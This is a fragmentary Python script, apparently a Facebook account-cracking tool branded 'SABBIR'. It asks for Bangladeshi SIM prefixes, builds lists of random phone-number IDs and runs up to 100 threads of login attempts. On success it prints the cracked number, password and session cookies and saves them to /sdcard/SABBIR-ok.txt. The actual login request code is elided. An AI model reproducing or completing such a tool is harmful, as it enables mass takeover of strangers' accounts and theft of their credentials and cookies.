...
logo=""" 
 .----------------.  .----------------.   .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   .----------------.  .----------------.   
| .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. |  
| | ____    ____ | || |  ________    | | | |    _______   | || |      __      | || |   ______     | || |   ______     | || |     _____    | || |  _______     | | | |    _______   | || |  _______     | |  
| ||_   \  /   _|| || | |_   ___ `.  | | | |   /  ___  |  | || |     /  \     | || |  |_   _ \    | || |  |_   _ \    | || |    |_   _|   | || | |_   __ \    | | | |   /  ___  |  | || | |_   __ \    | |  
| |  |   \/   |  | || |   | |   `. \ | | | |  |  (__ \_|  | || |    / /\ \    | || |    | |_) |   | || |    | |_) |   | || |      | |     | || |   | |__) |   | | | |  |  (__ \_|  | || |   | |__) |   | |  
| |  | |\  /| |  | || |   | |    | | | | | |   '.___`-.   | || |   / ____ \   | || |    |  __'.   | || |    |  __'.   | || |      | |     | || |   |  __ /    | | | |   '.___`-.   | || |   |  __ /    | |  
| | _| |_\/_| |_ | || |  _| |___.' / | | | |  |`\____) |  | || | _/ /    \ \_ | || |   _| |__) |  | || |   _| |__) |  | || |     _| |_    | || |  _| |  \ \_  | | | |  |`\____) |  | || |  _| |  \ \_  | |  
| ||_____||_____|| || | |________.'  | | | |  |_______.'  | || ||____|  |____|| || |  |_______/   | || |  |_______/   | || |    |_____|   | || | |____| |___| | | | |  |_______.'  | || | |____| |___| | |  
| |              | || |              | | | |              | || |              | || |              | || |              | || |              | || |              | | | |              | || |              | |  
| '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' |  
 '----------------'  '----------------'   '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   '----------------'  '----------------'   
...
def sykology():
    ...
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=BHAI(SABBIR)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" [𝑺𝑰𝑴𝑬 𝑪𝑶𝑫𝑬] 𝟎𝟏𝟖/𝟎𝟏𝟕/𝟎𝟏𝟗/𝟎𝟏𝟔/𝟎𝟏𝟓")
    ehc_code=input(" 𝑪𝑯𝑶𝑰𝑪𝑹 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬:")
    line()    
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=𝑬𝑯𝑪(SABBIR)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    ...
    for z in range(ehc_lim):
        ...
        emran.append(co)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=SABBIR (SABBIR)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[SABBIR 𝟎𝟏] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴")
    print(" \033[38;5;46m[SABBIR 𝟎𝟐] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴𝑩𝑨𝑺𝑰𝑪")
    print(" \033[38;5;46m[SABBIR 𝟎𝟑] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷𝑭𝑹𝑬𝑬")
    print(" \033[38;5;46m[SABBIR 𝟎𝟒] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷")
    print(" \033[38;5;46m[SABBIR 𝟎𝟓] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑿")
    print(" \033[38;5;46m[SABBIR 𝟎𝟔] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑻𝑶𝑼𝑪𝑯") 
    print(" \033[38;5;46m=============================")
    line()
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mSABBIR-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[✮⃝SABBIR𝄟⃝✔️ ᴠͥɪͣᴘͫ] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mSABBIR BHAI\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mSABBIR BHAI\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     SABBIR 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     SABBIR 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/SABBIR-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
